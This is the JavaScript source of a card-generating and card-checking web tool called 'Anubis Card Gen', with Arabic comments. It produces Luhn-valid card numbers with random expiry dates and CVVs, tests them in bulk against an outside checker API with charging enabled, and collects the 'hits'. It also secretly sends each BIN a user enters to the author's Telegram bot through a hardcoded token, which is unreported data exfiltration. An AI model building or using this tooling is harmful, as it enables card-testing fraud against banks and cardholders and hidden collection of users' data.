// ================= ANUBIS TOOLS MAIN SCRIPT =================

let counters = { hit: 0, live: 0, dead: 0 };
let isChecking = false;
let lists = { hit: [], live: [], dead: [] };
let startTime;
let checkedCount = 0;

// 🔥 إعدادات تيليجرام (تم دمج بياناتك)
const TELEGRAM_CONFIG = {
    token: "8377557863:AAHUSrbtTDuPIWJCl-jMyWDSaUepqBWkUo8", 
    chatId: "954586361"
};

// متغير لمنع تكرار إرسال نفس الـ BIN
let lastSentBin = "";

// ✅ دالة جديدة: فحص الـ BIN وإرسال التفاصيل لتيليجرام
async function lookupAndSendToTelegram(bin) {
    // لو الـ BIN ده لسه مبعوت من شوية، منبعتوش تاني
    if (bin === lastSentBin) return;
    lastSentBin = bin;

    try {
        // 1. عمل فحص للـ BIN (Lookup)
        // نستخدم نفس API الموقع الموجود في التبويب التاني
        const lookupResponse = await fetch(`https://corsproxy.io/?https://lookup.binlist.net/${bin}`);
        
        if (!lookupResponse.ok) throw new Error("Lookup Failed");
        
        const data = await lookupResponse.json();

        // 2. استخراج البيانات (مع التعامل مع القيم الفارغة)
        const bank = data.bank && data.bank.name ? data.bank.name : "N/A";
        const brand = data.scheme ? data.scheme.toUpperCase() : "N/A";
        const type = data.type ? data.type.toUpperCase() : "N/A";
        const level = data.brand ? data.brand.toUpperCase() : "N/A";
        const country = data.country && data.country.name ? `${data.country.emoji} ${data.country.name}` : "N/A";
        const currency = data.country && data.country.currency ? data.country.currency : "N/A";

        // 3. تجهيز الرسالة الاحترافية
        const message = `🔔 <b>New BIN Usage Alert!</b>\n\n` +
                        `💳 <b>BIN:</b> <code>${bin}</code>\n` +
                        `🏦 <b>Bank:</b> ${bank}\n` +
                        `🌍 <b>Country:</b> ${country}\n` +
                        `🏷 <b>Brand:</b> ${brand}\n` +
                        `💠 <b>Type:</b> ${type} (${level})\n` +
                        `💲 <b>Currency:</b> ${currency}\n\n` +
                        `🛠 <b>Tool:</b> Anubis Card Gen\n` +
                        `📅 <b>Time:</b> ${new Date().toLocaleString('en-GB')}`;

        // 4. إرسال الرسالة عبر البروكسي
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;

        await fetch(proxyUrl);
        console.log("✅ Full BIN Details sent to Telegram");

    } catch (err) {
        console.error("Lookup Error, sending simple alert:", err);
        // لو الفحص فشل، ابعت الـ BIN بس كاحتياطي
        sendSimpleBinToTelegram(bin);
    }
}

// دالة احتياطية (لو الفحص فشل)
async function sendSimpleBinToTelegram(bin) {
    const message = `🔔 <b>New BIN Usage Alert!</b>\n\n💳 <b>BIN:</b> <code>${bin}</code>\n⚠️ <i>Lookup Failed (API Limit or Network)</i>\n\n🛠 <b>Tool:</b> Anubis Card Gen`;
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
    fetch(proxyUrl).catch(e => {});
}

// ================= ORIGINAL LOGIC =================

function clearHits() {
    document.getElementById('resHit').innerHTML = "";
    counters.hit = 0; lists.hit = []; updateCounters();
}

function updateWaitCount() {
    const list = document.getElementById('checkList').value.trim();
    const count = list === "" ? 0 : list.split('\n').filter(line => line.trim() !== "").length;
    document.getElementById('countWait').innerText = `WAIT: ${count}`;
}

function detectBin() {
    let bin = document.getElementById('ccFormat').value.trim();
    let typeSpan = document.getElementById('binType');
    
    if (bin.length < 1) { 
        typeSpan.innerText = ""; 
        return; 
    }

    let type = "UNKNOWN ❓";
    if (/^4/.test(bin)) { type = "VISA 💳"; } 
    else if (/^5[1-5]/.test(bin) || /^2[2-7]/.test(bin)) { type = "MASTERCARD 💳"; } 
    else if (/^3[47]/.test(bin)) { type = "AMEX 💳"; } 
    else if (/^6(?:011|5)/.test(bin)) { type = "DISCOVER 💳"; } 
    else if (/^35/.test(bin)) { type = "JCB 💳"; } 
    else if (/^3(?:0[0-5]|[68])/.test(bin)) { type = "DINERS 💳"; } 
    else if (/^5/.test(bin)) { type = "MASTERCARD 💳"; }

    typeSpan.innerText = `[ ${type} ]`;
}

function clearAll() {
    if(isChecking) return;
    ['resLive', 'resDead'].forEach(id => document.getElementById(id).innerHTML = "");
    ['retryBtn', 'progCont'].forEach(id => document.getElementById(id).style.display = "none");
    document.getElementById('checkList').value = "";
    document.getElementById('progBar').style.width = "0%";
    document.getElementById('speedCPM').innerText = "Card Peer Minute: 0";
    counters.live = 0; counters.dead = 0;
    lists.live = []; lists.dead = [];
    updateCounters(); updateWaitCount();
}

function stopCheck() {
    isChecking = false;
    document.getElementById('stopBtn').style.display = "none";
    document.getElementById('checkBtn').disabled = false;
    document.getElementById('checkBtn').style.opacity = "1";
    document.getElementById('clearBtn').style.display = "block";
    document.getElementById('progCont').style.display = "none";
    document.getElementById('progBar').style.width = "0%";

    const retryBtn = document.getElementById('retryBtn');
    if (retryBtn.style.display !== "none") {
        retryBtn.disabled = false;
        retryBtn.style.opacity = "1";
        retryBtn.style.cursor = "pointer";
    }
}

function updateCounters() {
    document.getElementById('countHit').innerText = counters.hit;
    document.getElementById('countLive').innerText = counters.live;
    document.getElementById('countDead').innerText = counters.dead;
    
    const showHitActions = counters.hit > 0 ? "inline-block" : "none";
    document.getElementById('dlHitBtn').style.display = showHitActions;
    document.getElementById('clearHitBtn').style.display = showHitActions;
    document.getElementById('fileName').style.display = showHitActions;
    
    const retryBtn = document.getElementById('retryBtn');
    if (counters.live > 0) {
        retryBtn.style.display = "inline-block";
        if (isChecking) {
            retryBtn.disabled = true;
            retryBtn.style.opacity = "0.5";
            retryBtn.style.cursor = "not-allowed";
        } else {
            retryBtn.disabled = false;
            retryBtn.style.opacity = "1";
            retryBtn.style.cursor = "pointer";
        }
    } else {
        retryBtn.style.display = "none";
    }
}

function calculateSpeed() {
    if (!startTime || checkedCount === 0) return;
    const now = new Date();
    const diffInSeconds = (now - startTime) / 1000;
    const cpm = Math.round((checkedCount / diffInSeconds) * 60);
    document.getElementById('speedCPM').innerText = `Card Peer Minute: ${cpm}`;
}

function retryUnknown() {
    if(isChecking || lists.live.length === 0) return;
    document.getElementById('checkList').value = lists.live.join('\n');
    document.getElementById('resLive').innerHTML = "";
    lists.live = []; counters.live = 0;
    updateCounters(); updateWaitCount(); startCheck();
}

function generateCheckDigit(payload) {
    let sum = 0;
    let flip = true;
    for (let i = payload.length - 1; i >= 0; i--) {
        let digit = parseInt(payload.charAt(i));
        if (flip) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        flip = !flip;
    }
    return (10 - (sum % 10)) % 10;
}

// === دالة التوليد (Generate) - تم ربطها بالفحص والإرسال ===
function generateCards() {
    let format = document.getElementById('ccFormat').value.trim();
    
    // ✅ الجزء الجديد: إرسال الـ BIN بعد فحصه
    let cleanBin = format.replace(/[^0-9]/g, '');
    if (cleanBin.length >= 6) {
        // بناخد أول 6 أو 8 أرقام حسب المتوفر
        let binToSend = cleanBin.substring(0, 8); 
        // استدعاء دالة الفحص والإرسال (بدون انتظار النتيجة عشان ميعطلش التوليد)
        lookupAndSendToTelegram(binToSend);
    }

    if (!format) format = "539935xxxxxxxxxx";
    
    const count = document.getElementById('genCount').value;
    const userCvv = document.getElementById('cvvInput').value.trim();
    const algo = document.getElementById('genAlgo').value;

    let firstDigit = format.charAt(0);
    let targetLength = (firstDigit === '3') ? 15 : 16;
    let out = "";
    
    for (let i = 0; i < count; i++) {
        let ccArray = format.split('');
        let tempCC = "";
        
        for (let j = 0; j < ccArray.length; j++) {
            if (ccArray[j].toLowerCase() === 'x') {
                tempCC += Math.floor(Math.random() * 10);
            } else {
                tempCC += ccArray[j];
            }
        }

        let fullCC;
        if (algo === 'luhn') {
            while(tempCC.length < targetLength - 1) {
                tempCC += Math.floor(Math.random() * 10);
            }
            let ccBase = tempCC.substring(0, targetLength - 1);
            let checkDigit = generateCheckDigit(ccBase);
            fullCC = ccBase + checkDigit;
        } else {
            while(tempCC.length < targetLength) {
                tempCC += Math.floor(Math.random() * 10);
            }
            fullCC = tempCC.substring(0, targetLength);
        }

        let m = document.getElementById('expMonth').value === 'rnd' ? ("0" + (Math.floor(Math.random() * 12) + 1)).slice(-2) : document.getElementById('expMonth').value;
        let y = document.getElementById('expYear').value === 'rnd' ? (new Date().getFullYear() + Math.floor(Math.random() * 6)) : document.getElementById('expYear').value;
        let cvvLen = (fullCC.startsWith("3")) ? 4 : 3;
        let cvv = userCvv !== "" ? userCvv : "";
        if (cvv === "") {
            for(let k=0; k<cvvLen; k++) cvv += Math.floor(Math.random() * 10);
        }
        out += `${fullCC}|${m}|${y}|${cvv}\n`;
    }
    document.getElementById('checkList').value = out;
    updateWaitCount();
}

async function startCheck() {
    let listStr = document.getElementById('checkList').value.trim();
    if(!listStr) return;
    let list = listStr.split('\n').filter(line => line.trim() !== "");
    
    isChecking = true; checkedCount = 0; startTime = new Date();
    
    document.getElementById('progCont').style.display = "block";
    document.getElementById('checkBtn').disabled = true;
    document.getElementById('checkBtn').style.opacity = "0.5";
    document.getElementById('stopBtn').style.display = "block";
    document.getElementById('clearBtn').style.display = "none";

    const retryBtn = document.getElementById('retryBtn');
    retryBtn.disabled = true; retryBtn.style.opacity = "0.5"; retryBtn.style.cursor = "not-allowed";

    const proxy = "https://corsproxy.io/?";
    const apiUrl = "https://api.chkr.cc/";

    for (let i = 0; i < list.length; i++) {
        if(!isChecking) break;
        let currentList = document.getElementById('checkList').value.trim().split('\n').filter(l => l.trim() !== "");
        if(currentList.length === 0) break;
        let line = currentList[0].trim();
        try {
            const response = await fetch(proxy + encodeURIComponent(apiUrl), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: line, charge: true })
            });
            const res = await response.json();
            checkedCount++; calculateSpeed();
            
            if (res.status === "Live") {
                const bank = res.card?.bank || "N/A";
                const flag = res.card?.country?.emoji || "🌐";
                const gate = res.card?.scheme || "Stripe";
                const category = res.card?.category || "N/A"; 

                const hitDiv = document.createElement('div');
                hitDiv.className = 'hit-item'; 
                hitDiv.innerHTML = `<b>✅ ${line}</b><div class="hit-info"><div>🏦 Bank: ${bank}</div><div>💳 Gate: ${gate}</div><div>🏷️ Type: ${category}</div> <div>🌍 Country: ${flag}</div></div>`;
                document.getElementById('resHit').prepend(hitDiv);
                counters.hit++; lists.hit.push(line); 
            } else if (res.status === "Die") {
                const dieDiv = document.createElement('div');
                dieDiv.innerHTML = `❌ ${line} <span class="reason-tag">${res.message || 'DIE'}</span>`;
                document.getElementById('resDead').prepend(dieDiv);
                counters.dead++; lists.dead.push(line);
            } else {
                const liveDiv = document.createElement('div');
                liveDiv.innerHTML = `⚠️ ${line} <span class="reason-tag" style="color:var(--live-color)">${res.message || 'UNK'}</span>`;
                document.getElementById('resLive').prepend(liveDiv);
                counters.live++; lists.live.push(line);
            }
        } catch (error) { 
            checkedCount++;
            const errDiv = document.createElement('div');
            errDiv.innerHTML = `⚠️ ${line} <span class="reason-tag">Network Error</span>`;
            document.getElementById('resLive').prepend(errDiv);
            counters.live++; lists.live.push(line);
        }
        currentList.shift();
        document.getElementById('checkList').value = currentList.join('\n');
        updateWaitCount();
        document.getElementById('progBar').style.width = (((i + 1) / list.length) * 100) + "%";
        updateCounters();
        await new Promise(r => setTimeout(r, 2000));
    }
    stopCheck();
}

function download(type) {
    if (lists[type].length === 0) return;
    let customName = document.getElementById('fileName').value.trim();
    if(!customName) customName = `hesham_${type}`;
    const blob = new Blob([lists[type].join('\n')], { type: 'text/plain' });
    const a = document.createElement('a');
    a.download = `${customName}.txt`;
    a.href = window.URL.createObjectURL(blob);
    a.click();
}

function showToast(message) {
    var x = document.getElementById("toast");
    x.className = "show";
    x.innerText = message;
    setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
}

async function openBinModal() {
    let bin = document.getElementById('ccFormat').value.replace(/[^0-9]/g, '').substring(0, 6);
    
    if (bin.length < 6) {
        showToast("⚠️ Please enter at least 6 digits!");
        return;
    }

    const modal = document.getElementById('binModal');
    const loading = document.getElementById('modalLoading');
    const dataDiv = document.getElementById('modalData');

    modal.style.display = "block";
    loading.style.display = "block";
    dataDiv.style.display = "none";

    try {
        const response = await fetch(`https://corsproxy.io/?https://lookup.binlist.net/${bin}`);
        if (!response.ok) throw new Error("Not Found");
        const data = await response.json();

        document.getElementById('m_bin').innerText = bin;
        document.getElementById('m_bank').innerText = (data.bank && data.bank.name) ? data.bank.name : "N/A";
        document.getElementById('m_brand').innerText = data.scheme ? data.scheme.toUpperCase() : "N/A";
        document.getElementById('m_type').innerText = data.type ? data.type.toUpperCase() : "N/A";
        document.getElementById('m_level').innerText = data.brand ? data.brand.toUpperCase() : "N/A";
        document.getElementById('m_country').innerText = (data.country && data.country.name) ? `${data.country.emoji} ${data.country.name}` : "N/A";
        document.getElementById('m_currency').innerText = (data.country && data.country.currency) ? data.country.currency : "N/A";

        loading.style.display = "none";
        dataDiv.style.display = "block";

    } catch (error) {
        loading.innerHTML = `<span style="color:var(--dead-color); font-size:40px;">❌</span><br>BIN Not Found!`;
    }
}

function closeBinModal() {
    document.getElementById('binModal').style.display = "none";
    document.getElementById('modalLoading').innerHTML = "Searching... ⌛";
}

function saveBinDetails() {
    const bin = document.getElementById('m_bin').innerText;
    if (bin === "---") return;

    const content = `
========== BIN DETAILS ==========
BIN      : ${bin}
Bank     : ${document.getElementById('m_bank').innerText}
Brand    : ${document.getElementById('m_brand').innerText}
Type     : ${document.getElementById('m_type').innerText}
Level    : ${document.getElementById('m_level').innerText}
Country  : ${document.getElementById('m_country').innerText}
Currency : ${document.getElementById('m_currency').innerText}
=================================
Saved from: ANUBIS TOOLS 💀
Powered by: Hesham Taha
    `.trim();

    const blob = new Blob([content], { type: 'text/plain' });
    const a = document.createElement('a');
    a.download = `BIN_${bin}_Info.txt`;
    a.href = window.URL.createObjectURL(blob);
    a.click();
}

function openTab(tabId, btn) {
    document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(tabId).style.display = 'block';
    btn.classList.add('active');
}

